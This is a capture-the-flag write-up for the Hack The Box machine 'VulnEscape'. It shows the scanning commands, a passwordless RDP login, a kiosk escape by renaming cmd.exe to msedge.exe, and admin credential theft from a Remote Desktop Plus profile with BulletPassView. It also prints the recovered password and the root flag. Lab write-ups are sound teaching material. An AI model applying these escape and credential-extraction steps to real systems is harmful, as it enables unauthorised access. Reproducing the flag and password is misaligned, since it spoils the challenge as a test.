---
layout: writeup
name: "Vulnescape"
platform: "HackTheBox"
category: "retired"
difficulty: "Easy"
os: "Hack The Box"
date: 2025-11-12
pwned: true
---
# 🧪 VulnEscape – Hack The Box

**Platform:** Hack The Box  
**Difficulty:** Easy  
**IP Address:** 10.129.234.51  
**Date Completed:** 2025-07-27  

---

## 🧭 Overview

VulnEscape is an Easy-rated Windows machine where RDP is the sole exposed service. A user named `KioskUser0` can log in via RDP with no password, but the environment is restricted by kiosk-style policies. Exploiting Microsoft Edge’s `file://` scheme allows file system access, and a trick involving renaming `cmd.exe` to `msedge.exe` leads to command execution. Further privilege escalation is achieved by extracting admin credentials from a Remote Desktop Plus profile using BulletPassView. These creds are used with `runas` to gain a full administrator PowerShell session, bypassing UAC and retrieving the root flag.

---

## 🔍 Enumeration

### 🔎 Nmap

```bash
nmap -p- --min-rate 10000 10.129.234.51
nmap -p 3389 -sCV -oN nmapscan 10.129.234.51
```

```
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: ESCAPE
|   NetBIOS_Domain_Name: ESCAPE
|   NetBIOS_Computer_Name: ESCAPE
|   Product_Version: 10.0.19041
```

---

## 🪜 Exploitation

### ✅ RDP Access

```bash
netexec rdp 10.129.234.51 -u KioskUser0 -p ''
xfreerdp3 /v:10.129.234.51 "/u:Escape\KioskUser0" /p:""
```

This gives access to a restricted desktop environment.

### 🗂️ Kiosk Escape

- Open Microsoft Edge
- Visit: `file://C:\` to browse the file system
- Copy `cmd.exe`, rename it to `msedge.exe`, and run it
- Use that to grab `user.txt` from the desktop

---

## ⚙️ Privilege Escalation

- Inside `C:\admin\`, discover `profile.xml` used by **Remote Desktop Plus**
- Load it into RD Plus and use **BulletPassView** to extract saved password:
  ```
  Twisting3021
  ```
- Spawn admin PowerShell:

```cmd
runas /user:admin powershell
start-process powershell -verb runas
```

### 🎯 Root Flag

```
root.txt
5c38d518996a362275e756ddbab14513
```

---

## 🧠 Lessons Learned

- RDP can be a viable entry point even on “kiosk” setups
- `file://` schemes can leak valuable filesystem views
- `cmd.exe` rename bypasses shell restrictions
- Credential managers and saved RDP sessions can be abused with tools like BulletPassView

---

## 📸 Proof

![vulnescape.png](proofs/vulnescape.png)